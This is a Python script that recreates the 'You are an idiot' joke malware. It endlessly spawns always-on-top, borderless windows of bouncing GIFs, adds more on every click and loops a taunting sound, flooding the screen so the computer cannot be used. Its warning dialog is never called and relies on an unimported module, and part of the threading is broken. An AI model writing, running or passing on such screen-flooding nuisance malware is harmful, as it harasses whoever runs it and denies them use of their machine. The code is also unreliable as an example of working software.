import tkinter as tk
from PIL import Image, ImageTk, ImageSequence
import random
import threading
import time
import pygame

# --- Varování na začátku ---

def show_warning():
    msg1 = (
        "This EXE file makes for education and entertainment purposes only.\n"
        "If you are running this software on physical hardware, shut down CVIKLI."
    )
    ctypes.windll.user32.MessageBoxW(0, msg1, "WARNING", 0)

    msg2 = "CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGES ON YOUR SYSTEM32"
    ctypes.windll.user32.MessageBoxW(0, msg2, "DISCLAIMER", 0)

GIFS = ["you-are-an-idiot.gif", "you-are-an-idiot-idiot1.gif"]
SOUND = "idiot.mp3"

def play_sound():
    pygame.mixer.init()
    while True:
        pygame.mixer.music.load(SOUND)
        pygame.mixer.music.play()
        time.sleep(5)

def spawn_window():
    gif_file = random.choice(GIFS)
    img = Image.open(gif_file)
    frames = [ImageTk.PhotoImage(f.convert('RGBA')) for f in ImageSequence.Iterator(img)]

    win = tk.Toplevel()
    win.overrideredirect(True)
    win.attributes("-topmost", True)

    size = 600  # změněno na 600x600
    screen_width = win.winfo_screenwidth()
    screen_height = win.winfo_screenheight()
    x = random.randint(0, screen_width - size)
    y = random.randint(0, screen_height - size)
    win.geometry(f"{size}x{size}+{x}+{y}")

    lbl = tk.Label(win, bd=0)
    lbl.pack(fill="both", expand=True)

    def animate(index=0):
        lbl.config(image=frames[index])
        win.after(100, animate, (index + 1) % len(frames))

    animate()

    dx = random.choice([-10, 10])
    dy = random.choice([-10, 10])

    def move():
        nonlocal x, y, dx, dy
        x += dx
        y += dy

        if x <= 0 or x >= screen_width - size:
            dx *= -1
        if y <= 0 or y >= screen_height - size:
            dy *= -1

        win.geometry(f"{size}x{size}+{x}+{y}")
        win.after(30, move)

    move()

def spam_windows():
    while True:
        for _ in range(20):
            spawn_window()
        time.sleep(1)

def main():
    root = tk.Tk()
    root.withdraw()

    root.bind("<Button>", lambda e: [spawn_window() for _ in range(10)])

    threading.Thread(target=play_sound, daemon=True).start()
    threading.Thread(target=spam_windows, daemon=True).start()

    root.mainloop()

main()
